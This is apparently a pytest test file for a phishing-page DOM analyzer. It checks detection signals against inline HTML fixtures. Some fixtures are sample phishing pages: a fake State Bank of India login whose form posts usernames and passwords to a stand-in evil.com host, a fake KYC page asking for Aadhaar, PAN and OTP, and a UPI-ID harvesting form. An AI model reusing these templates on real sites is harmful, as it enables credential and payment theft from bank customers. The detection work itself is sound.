"""Tests for DOM analyzer with comprehensive HTML fixtures.

Tests all Stage 4 signals from spec with inline fixtures.
"""

import pytest

from app.sandbox.dom_analyzer import analyze


# Helper to load brands for testing
@pytest.fixture
def test_brands():
    """Sample brands for testing."""
    return [
        {
            'id': 'sbi',
            'display_name': 'State Bank of India',
            'keywords': ['sbi', 'state bank', 'state bank of india'],
            'official_domains': ['sbi.co.in', 'onlinesbi.sbi'],
        },
        {
            'id': 'hdfc',
            'display_name': 'HDFC Bank',
            'keywords': ['hdfc', 'hdfc bank'],
            'official_domains': ['hdfcbank.com'],
        },
        {
            'id': 'google',
            'display_name': 'Google',
            'keywords': ['google'],
            'official_domains': ['google.com', 'google.co.in'],
        },
    ]


class TestDOMAnalyzer:
    """Test DOM analyzer signals."""

    def test_plain_blog_no_signals(self, test_brands):
        """Plain blog should have no risk signals."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>My Blog</title></head>
        <body>
            <h1>Welcome</h1>
            <p>This is a personal blog.</p>
            <a href="/about">About</a>
            <a href="/contact">Contact</a>
            <a href="/privacy">Privacy</a>
        </body>
        </html>
        """
        result = analyze(html, 'https://myblog.com', 'https://myblog.com', brands=test_brands)

        # Should have no risk signals (may have evidence)
        assert len([s for s in result.signals if s.points > 0]) == 0
        assert result.evidence['has_contact_link'] is True
        assert result.evidence['has_privacy_link'] is True

    def test_legit_razorpay_checkout(self, test_brands):
        """Legit shop with Razorpay should get negative signal."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Checkout - MyShop</title></head>
        <body>
            <h1>Complete Payment</h1>
            <form action="https://api.razorpay.com/v1/checkout" method="POST">
                <input type="text" name="amount" value="1000">
                <button>Pay Now</button>
            </form>
            <script src="https://checkout.razorpay.com/v1/checkout.js"></script>
        </body>
        </html>
        """
        result = analyze(html, 'https://myshop.com', 'https://myshop.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'RECOGNIZED_GATEWAY' in signal_ids
        gateway_signal = next(s for s in result.signals if s.id == 'RECOGNIZED_GATEWAY')
        assert gateway_signal.points == -10

    def test_fake_bank_cross_domain_form(self, test_brands):
        """Fake bank with cross-domain form should trigger multiple signals."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>SBI Online Banking Login</title></head>
        <body>
            <h1>State Bank of India - NetBanking</h1>
            <form action="https://evil.com/collect.php" method="POST">
                <input type="text" name="username" placeholder="User ID">
                <input type="password" name="password" placeholder="Password">
                <button>Login</button>
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://sbi-secure.xyz', 'https://sbi-secure.xyz', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_PASSWORD_FIELD' in signal_ids
        assert 'FORM_POSTS_CROSS_DOMAIN' in signal_ids
        assert 'BRAND_TEXT_DOMAIN_MISMATCH' in signal_ids
        assert 'BRAND_LOOKALIKE_ON_FOREIGN_DOMAIN' in signal_ids  # Combination rule

    def test_fake_kyc_aadhaar_fields(self, test_brands):
        """Fake KYC page with Aadhaar/PAN/OTP fields."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Complete Your KYC</title></head>
        <body>
            <h1>KYC Verification Required</h1>
            <p>Your account will be blocked within 24 hours if KYC is not completed.</p>
            <form method="POST">
                <input type="text" name="aadhaar" placeholder="Aadhaar Number">
                <input type="text" name="pan" placeholder="PAN Card">
                <input type="text" name="otp" placeholder="Enter OTP">
                <button>Submit</button>
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://kyc-update.site', 'https://kyc-update.site', brands=test_brands, domain_age_days=5)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_OTP_PIN_FIELD' in signal_ids
        assert 'URGENCY_LANGUAGE' in signal_ids
        assert 'CREDENTIAL_OR_PAYMENT_ON_YOUNG_DOMAIN' in signal_ids

    def test_upi_collect_harvesting(self, test_brands):
        """Page harvesting UPI IDs."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Verify Your UPI</title></head>
        <body>
            <h1>UPI Verification</h1>
            <form method="POST">
                <label>Enter your UPI ID:</label>
                <input type="text" name="upi_id" placeholder="yourname@ybl">
                <button>Verify</button>
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://upi-verify.com', 'https://upi-verify.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_UPI_ID_FIELD' in signal_ids

    def test_hidden_iframe(self, test_brands):
        """Page with hidden iframe."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Special Offer</title></head>
        <body>
            <h1>Claim Your Prize!</h1>
            <iframe src="https://evil.com/tracker" width="1" height="1"></iframe>
        </body>
        </html>
        """
        result = analyze(html, 'https://offer.site', 'https://offer.site', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HIDDEN_IFRAME' in signal_ids

    def test_meta_refresh_redirect(self, test_brands):
        """Page with meta refresh to different domain."""
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="0; url=https://evil.com/phish">
        </head>
        <body>
            <p>Please wait...</p>
        </body>
        </html>
        """
        result = analyze(html, 'https://short.link', 'https://short.link', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'META_REFRESH_REDIRECT' in signal_ids

    def test_urgency_english(self, test_brands):
        """Page with English urgency language."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Important Notice</title></head>
        <body>
            <h1>Your account has been suspended!</h1>
            <p>Please verify your details immediately or your account will be permanently blocked.</p>
            <p>Act now within 24 hours to avoid closure.</p>
        </body>
        </html>
        """
        result = analyze(html, 'https://notice.com', 'https://notice.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'URGENCY_LANGUAGE' in signal_ids

    def test_urgency_hinglish(self, test_brands):
        """Page with Hinglish/Hindi urgency language."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>खाता सूचना</title></head>
        <body>
            <h1>महत्वपूर्ण सूचना</h1>
            <p>आपका खाता बंद हो जाएगा। तुरंत अपडेट करें।</p>
        </body>
        </html>
        """
        result = analyze(html, 'https://notice-hi.com', 'https://notice-hi.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'URGENCY_LANGUAGE' in signal_ids

    def test_obfuscated_js(self, test_brands):
        """Page with obfuscated JavaScript."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Loading...</title></head>
        <body>
            <script>
                var data = atob("SGVsbG8gV29ybGQ=");
                eval(unescape("%48%65%6c%6c%6f"));
                eval(atob("Y29uc29sZS5sb2c="));
            </script>
        </body>
        </html>
        """
        result = analyze(html, 'https://obf.site', 'https://obf.site', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'OBFUSCATED_JS' in signal_ids

    def test_right_click_disabled(self, test_brands):
        """Page with right-click disabled."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Protected Content</title></head>
        <body oncontextmenu="return false;">
            <h1>Copyright Protected</h1>
        </body>
        </html>
        """
        result = analyze(html, 'https://protected.com', 'https://protected.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'RIGHT_CLICK_DISABLED' in signal_ids

    def test_no_trust_pages(self, test_brands):
        """Page without trust links."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Quick Sale</title></head>
        <body>
            <h1>Buy Now!</h1>
            <a href="/product1">Product 1</a>
            <a href="/product2">Product 2</a>
            <a href="/product3">Product 3</a>
            <a href="/product4">Product 4</a>
            <a href="/product5">Product 5</a>
            <a href="/product6">Product 6</a>
        </body>
        </html>
        """
        result = analyze(html, 'https://quicksale.xyz', 'https://quicksale.xyz', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'NO_TRUST_PAGES' in signal_ids

    def test_legit_login_same_domain(self, test_brands):
        """Legit login on same domain should NOT trigger cross-domain."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Login - MyBank</title></head>
        <body>
            <h1>MyBank Login</h1>
            <form action="/auth/login" method="POST">
                <input type="text" name="username">
                <input type="password" name="password">
                <button>Login</button>
            </form>
            <a href="/about">About</a>
            <a href="/contact">Contact</a>
        </body>
        </html>
        """
        result = analyze(html, 'https://mybank.com/login', 'https://mybank.com/login', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        # Should have password field but NOT cross-domain
        assert 'HAS_PASSWORD_FIELD' in signal_ids
        assert 'FORM_POSTS_CROSS_DOMAIN' not in signal_ids

    def test_legit_bank_own_brand(self, test_brands):
        """Legit bank mentioning its own brand should NOT trigger mismatch."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>SBI NetBanking</title></head>
        <body>
            <h1>State Bank of India</h1>
            <p>Welcome to SBI Online Banking</p>
            <a href="/contact">Contact</a>
            <a href="/privacy">Privacy</a>
        </body>
        </html>
        """
        result = analyze(html, 'https://onlinesbi.sbi', 'https://onlinesbi.sbi', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        # Should NOT trigger brand mismatch on official domain
        assert 'BRAND_TEXT_DOMAIN_MISMATCH' not in signal_ids

    def test_password_field_only_low_points(self, test_brands):
        """Page with only password field should have low points."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Login</title></head>
        <body>
            <form method="POST">
                <input type="password" name="pass">
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://app.example.com', 'https://app.example.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_PASSWORD_FIELD' in signal_ids

        # Total points should be only 5 (just password field)
        total_points = sum(s.points for s in result.signals)
        assert total_points == 5

    def test_forum_with_bank_word_no_mismatch(self, test_brands):
        """Forum mentioning 'bank' in text should NOT trigger brand match."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>Finance Forum</title></head>
        <body>
            <h1>Discussion: Best Banks in India</h1>
            <p>What do you think about SBI's new policies?</p>
            <p>I bank with HDFC and like their service.</p>
            <a href="/about">About</a>
        </body>
        </html>
        """
        result = analyze(html, 'https://financeforum.net', 'https://financeforum.net', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        # Should trigger brand text mismatch since it mentions SBI/HDFC
        # but points should be moderate
        if 'BRAND_TEXT_DOMAIN_MISMATCH' in signal_ids:
            # This is acceptable - the page does mention banks
            pass

    def test_non_english_page(self, test_brands):
        """Non-English page should still be analyzed."""
        html = """
        <!DOCTYPE html>
        <html>
        <head><title>日本語のページ</title></head>
        <body>
            <h1>ようこそ</h1>
            <p>これは日本語のページです。</p>
        </body>
        </html>
        """
        result = analyze(html, 'https://jp-site.jp', 'https://jp-site.jp', brands=test_brands)

        # Should complete without errors
        assert result.signals is not None

    def test_huge_page_truncated(self, test_brands):
        """Huge page should be truncated."""
        html = "<!DOCTYPE html><html><body>" + ("x" * 600_000) + "</body></html>"

        result = analyze(html, 'https://huge.com', 'https://huge.com', brands=test_brands)

        # Should indicate truncation in evidence
        assert result.evidence.get('html_truncated') is True

    def test_malformed_html(self, test_brands):
        """Malformed HTML should be handled gracefully."""
        html = "<html><body><form><input type='password'</form><div><p>Unclosed tags"

        result = analyze(html, 'https://malformed.com', 'https://malformed.com', brands=test_brands)

        # Should complete (lxml is lenient)
        assert result.signals is not None

    def test_card_fields_detection(self, test_brands):
        """Detect credit card fields."""
        html = """
        <!DOCTYPE html>
        <html>
        <body>
            <form method="POST">
                <input type="text" name="cc_number" placeholder="Card Number">
                <input type="text" name="cvv" placeholder="CVV">
                <input type="text" name="expiry" placeholder="MM/YY">
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://pay.site', 'https://pay.site', brands=test_brands, domain_age_days=100)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_CARD_FIELDS' in signal_ids
        assert 'PAYMENT_WITHOUT_KNOWN_GATEWAY' in signal_ids  # No recognized gateway

    def test_form_posts_to_http(self, test_brands):
        """Form posting to HTTP with password."""
        html = """
        <!DOCTYPE html>
        <html>
        <body>
            <form action="http://insecure.com/login" method="POST">
                <input type="text" name="user">
                <input type="password" name="pass">
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://site.com', 'https://site.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_PASSWORD_FIELD' in signal_ids
        assert 'FORM_POSTS_TO_HTTP' in signal_ids
        assert 'FORM_POSTS_CROSS_DOMAIN' in signal_ids

    def test_form_action_empty_with_password(self, test_brands):
        """Form with empty action and password field."""
        html = """
        <!DOCTYPE html>
        <html>
        <body>
            <form action="" method="POST">
                <input type="password" name="pass">
            </form>
        </body>
        </html>
        """
        result = analyze(html, 'https://site.com', 'https://site.com', brands=test_brands)

        signal_ids = {s.id for s in result.signals}
        assert 'HAS_PASSWORD_FIELD' in signal_ids
        assert 'FORM_ACTION_EMPTY_OR_JS' in signal_ids

    def test_redirect_chain_cross_domain(self, test_brands):
        """Multiple redirects across domains."""
        redirect_chain = [
            {'url': 'https://short.ly/abc', 'status': 302},
            {'url': 'https://tracker.net/xyz', 'status': 302},
            {'url': 'https://redirect.io/123', 'status': 302},
            {'url': 'https://final.com', 'status': 200},
        ]

        html = "<html><body>Final page</body></html>"
        result = analyze(
            html,
            'https://short.ly/abc',
            'https://final.com',
            brands=test_brands,
            redirect_chain=redirect_chain
        )

        signal_ids = {s.id for s in result.signals}
        assert 'REDIRECT_CHAIN_CROSS_DOMAIN' in signal_ids

    def test_auto_download_flag(self, test_brands):
        """Auto download flag from sandbox."""
        html = "<html><body>Downloading...</body></html>"

        result = analyze(
            html,
            'https://download.site',
            'https://download.site',
            brands=test_brands,
            auto_download=True
        )

        signal_ids = {s.id for s in result.signals}
        assert 'AUTO_DOWNLOAD_ATTEMPT' in signal_ids
        download_signal = next(s for s in result.signals if s.id == 'AUTO_DOWNLOAD_ATTEMPT')
        assert download_signal.points == 30
